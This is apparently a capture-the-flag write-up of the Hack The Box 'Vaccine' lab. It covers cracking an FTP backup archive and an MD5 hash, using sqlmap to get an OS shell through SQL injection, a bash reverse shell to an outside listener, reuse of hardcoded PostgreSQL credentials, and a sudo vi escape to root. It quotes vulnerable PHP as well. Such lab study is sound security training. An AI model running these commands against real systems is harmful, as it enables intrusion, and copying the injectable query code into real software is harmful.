---
title: "HTB - Vaccine Writeup - Linux (Very Easy)"
date: 2026-10-25 12:00:00 -0400
categories: [HTB, Linux(Very Easy)]
tags: [htb, veryeasy, liunux]
image:
  path: /assets/img/headers/Vaccine.png
  alt: HTB-Vaccine
---


| Target Property  | Details                        |
| :--------------- | :----------------------------- |
| **Machine Name** | Vaccine                        |
| **Platform**     | Hack The Box (Very Easy Linux) |
| **Server IP**    | 10.129.227.248                 |
| **Open Ports**   | 21, 22, 80                     |
| **Date Solved**  | 2026/10/29                     |



[Hack The Box - Vaccine](https://app.hackthebox.com/machines/Vaccine)






`Summary:`
The **Vaccine** machine on Hack The Box presents a multi-stage attack path centered on initial credential harvesting and privilege escalation via configuration management. The target hosts open services for FTP, SSH, and HTTP. Anonymous FTP access yields a password-protected backup archive; cracking this archive with `zip2john` and `john` reveals application source files and an MD5 hash for the web portal's administrative user.

Authenticating to the web interface with the cracked credentials grants access to a search parameter on `dashboard.php` that is vulnerable to SQL injection. Using session cookies with `sqlmap` allows command execution through an OS shell, which can then be upgraded to an interactive TCP reverse shell. Analyzing `dashboard.php` locally reveals hardcoded credentials for the target's PostgreSQL instance. This enables lateral movement via SSH as the `postgres` user, who possesses passwordless `sudo` privileges to execute `/bin/vi` on PostgreSQL configuration files. Spawning a shell directly from `vi` completes the escalation path to full `root` privileges.



Port Scan
we see there are Vaccine port open for vaccine.htb  21, 22 and 80 
and we are able to anonymous login to the ftp service
```
┌──(chako㉿kali)-[~]
└─$ nmap -p 21,22,80 -sCV  vaccine.htb                                                                                                                                                                                                            
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-30 00:38 -0400
Nmap scan report for vaccine.htb (10.129.38.106)
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.177
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds

```



ftp download the file
```
┌──(chako㉿kali)-[/tmp]
└─$ ftp vaccine.htb
Connected to vaccine.htb.
220 (vsFTPd 3.0.3)
Name (vaccine.htb:chako): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10895|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10011|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |*****************************************************************************************************************************************************************************************************|  2533        6.89 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (5.58 KiB/s)
ftp> bye
221 Goodbye.

```


It is password protected 
```
┌──(chako㉿kali)-[/tmp]
└─$ unzip backup.zip                                                                                                                                                                                                                              
Archive:  backup.zip
[backup.zip] index.php password: 

```

crack the zip file and we got two files `index.php ` and `style.css`
```
┌──(chako㉿kali)-[/tmp]
└─$ fcrackzip -v -u -D -p ~/tools/wordlist/rockyou.txt backup.zip
found file 'index.php', (size cp/uc   1201/  2594, flags 9, chk 5722)
found file 'style.css', (size cp/uc    986/  3274, flags 9, chk 989a)


PASSWORD FOUND!!!!: pw == 741852963


┌──(chako㉿kali)-[/tmp]
└─$ unzip backup.zip                                                                                                                                                                                                                               
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css     

```

in the index.php we can see the login user name is admin and the password is md5 hashed (2cb42f8734ea607eefed3b70af13bbd3) 
```
┌──(chako㉿kali)-[/tmp]
└─$ head -n 10 index.php                                                                                                                                                                                                                           
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>


```


lets try to crack the md5 hash with `john`  and we got the password!!  `qwerty789`
```

┌──(chako㉿kali)-[/tmp]
└─$ echo '2cb42f8734ea607eefed3b70af13bbd3' >hash.md5

┌──(chako㉿kali)-[/tmp]
└─$ john --format=raw-md5  --wordlist=~/tools/wordlist/rockyou.txt hash.md5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     
1g 0:00:00:00 DONE (2026-10-30 00:55) 50.00g/s 5030Kp/s 5030Kc/s 5030KC/s shunda..mikeyd
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```


Although we are not able to ssh login with the credential but  we can try to use the login credential and try to login to the web page
![Web login](/assets/img/Write-Up/HTB/veryeasy/linux/Vaccine/web_login.png)


we can login to the web !!
![Web login](/assets/img/Write-Up/HTB/veryeasy/linux/Vaccine/web_login2.png)


vaccine.htb website's `search` parameter actually has sql injection vulnerability 
![SQLi](/assets/img/Write-Up/HTB/veryeasy/linux/Vaccine/sql_inj.png)


Use the exported the session cookie with sqlmap
![SQLi session](/assets/img/Write-Up/HTB/veryeasy/linux/Vaccine/login_session_cookie.png)



we can try to get the shell from sql injection with sqlmap
```
sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=j7j86leb2e58qn0c9naoonsvsg" --os-shell

```

![SQLi shell](/assets/img/Write-Up/HTB/veryeasy/linux/Vaccine/sql_inj_shell.png)




got reversed shell from the sql shell
```
[01:22:29] [WARNING] the SQL query provided does not return any output
[01:22:29] [INFO] retrieved: 
No output
os-shell> bash -c "bash -i >& /dev/tcp/10.10.14.177/9000 0>&1"


┌──(chako㉿kali)-[/tmp]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.177] from (UNKNOWN) [10.129.38.106] 54364
bash: cannot set terminal process group (2924): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ 

```


we found another login credential in dashboard.php
`user=postgres password=P@s5w0rd!`
```
postgres@vaccine:/var/www/html$ sed -n '20,60p' dashboard.php
sed -n '20,60p' dashboard.php
</div>
</form>
  </div>
  
  <table id="keywords" cellspacing="0" cellpadding="0">
    <thead>
      <tr>
        <th><span style="color: white">Name</span></th>
        <th><span style="color: white">Type</span></th>
        <th><span style="color: white">Fuel</span></th>
        <th><span style="color: white">Engine</span></th>
      </tr>
    </thead>
    <tbody>
        <?php
        session_start();
        if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }

        catch ( exception $e ) {
          echo $e->getMessage();
        }

        if(isset($_REQUEST['search'])) {

          $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";

          $result = pg_query($conn,$q);

          if (!$result)
          {
                            die(pg_last_error($conn));
          }
          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
              {
                echo "
postgres@vaccine:/var/www/html$ 

```


we are able to ssh into the host with the newly discoed login user name and password 
```
┌──(chako㉿kali)-[/tmp]
└─$ ssh postgres@vaccine.htb                                                                                                                                                                                                                       
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
postgres@vaccine.htb's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
....
....

postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ftpuser:x:1002:1002:,,,:/home/ftpuser:/bin/sh
postgres@vaccine:~$ cat user.txt 
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:~$ 

```


check `sudo` right and we can see user `postgres` is able to run `vi /etc/postgresql/11/main/pg_hba.conf` with root
```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$ 

```


we can abuse the sudo `vi` access right  ([https://gtfobins.org/gtfobins/vi/](https://gtfobins.org/gtfobins/vi/))
and we got root shell!!
```
sudo -l
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell
whoami




postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

# whoami
root
# 

# cd /root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt
dd6e058e814260bc70e9bbdef2715849
# 

```


